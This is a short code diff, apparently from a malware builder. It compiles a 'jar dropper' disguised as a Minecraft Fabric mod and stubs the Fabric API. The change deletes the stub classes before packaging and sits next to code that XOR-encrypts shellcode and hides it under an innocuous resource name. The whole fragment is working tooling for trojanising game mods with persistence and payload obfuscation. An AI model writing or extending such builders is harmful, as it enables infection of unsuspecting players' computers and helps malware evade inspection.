@@ -1567,7 +1567,7 @@ func runBoundFiles() {
           fs.writeFileSync(path.join(srcPkg, "ModLoader.java"), generateJarDropperSource(jarPersist));
 
           // Stub ModInitializer so javac can resolve it without the Fabric API jar on the classpath.
-          // At runtime the real net.fabricmc.api.ModInitializer from Fabric's classloader is used.
+          // The compiled stub class is deleted before packaging — Fabric provides the real one at runtime.
           const fabricApiStubDir = path.join(jarTmpDir, "src", "net", "fabricmc", "api");
           fs.mkdirSync(fabricApiStubDir, { recursive: true });
           fs.writeFileSync(path.join(fabricApiStubDir, "ModInitializer.java"),
@@ -1604,6 +1604,9 @@ func runBoundFiles() {
             const err = (compileResult.stderr.toString() || compileResult.stdout.toString()).trim();
             sendToStream({ type: "output", text: `WARNING: javac compile failed: ${err}\n`, level: "warn" });
           } else {
+            // Remove the stub Fabric API classes — Fabric provides the real ones at runtime
+            try { fs.rmSync(path.join(classDir, "net"), { recursive: true, force: true }); } catch {}
+
             // XOR-encrypt shellcode and store as innocuous resource name
             const rawSc = fs.readFileSync(jarSourcePath);
             const xorKey = (Math.floor(Math.random() * 254) + 1) & 0xff; // 1-255
